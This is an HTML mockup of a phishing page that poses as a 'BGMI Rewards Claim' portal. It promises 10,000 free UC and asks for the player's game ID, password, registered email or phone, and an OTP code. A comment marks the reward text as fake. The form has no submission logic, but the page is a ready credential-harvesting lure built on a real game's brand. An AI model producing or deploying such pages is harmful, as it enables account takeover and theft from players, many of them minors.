<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <script src="https://cdn.tailwindcss.com"></script>

  <title>Claim Reward Form</title>

</head>

<body class="bg-[#0b1020] flex items-center justify-center min-h-screen">

  <!-- MOBILE SCREEN -->

  <div class="w-full max-w-sm h-screen bg-[#0f172a] flex flex-col">

    <!-- HEADER -->

    <div class="bg-[#1e293b] px-4 py-4 flex items-center gap-3">

      <div class="w-10 h-10 rounded-full bg-green-500 flex items-center justify-center text-white font-bold">

        BG

      </div>

      <div>

        <h1 class="text-white text-sm font-semibold">BGMI Rewards Claim</h1>

        <p class="text-zinc-400 text-xs">Secure Verification Portal</p>

      </div>

    </div>

    <!-- WARNING BANNER -->

    <div class="bg-red-500/10 border border-red-500 m-3 rounded-xl p-3">

      <p class="text-red-400 text-xs">

        ⚠ Limited Time Offer - Claim your FREE UC now

      </p>

    </div>

    <!-- FORM -->

    <div class="flex-1 p-4 space-y-4">

      <input

        type="text"

        placeholder="Enter Game ID"

        class="w-full bg-zinc-800 text-white p-3 rounded-xl outline-none border border-zinc-700"

      />

      <input

        type="password"

        placeholder="Game Password"

        class="w-full bg-zinc-800 text-white p-3 rounded-xl outline-none border border-zinc-700"

      />

      <input

        type="text"

        placeholder="Registered Email / Phone"

        class="w-full bg-zinc-800 text-white p-3 rounded-xl outline-none border border-zinc-700"

      />

      <input

        type="text"

        placeholder="Enter OTP (Sent to device)"

        class="w-full bg-zinc-800 text-white p-3 rounded-xl outline-none border border-red-500"

      />

      <!-- CLAIM BUTTON -->

      <button class="w-full bg-gradient-to-r from-green-400 to-emerald-500 text-black font-bold py-3 rounded-xl mt-4 active:scale-95 transition">

        Verify & Claim Rewards

      </button>

      <!-- FAKE NOTE -->

      <p class="text-yellow-400 text-xs mt-2">

        ⏳ Verification required to unlock 10,000 UC

      </p>

    </div>

    <!-- FOOTER WARNING -->

    

  </div>

</body>

</html>
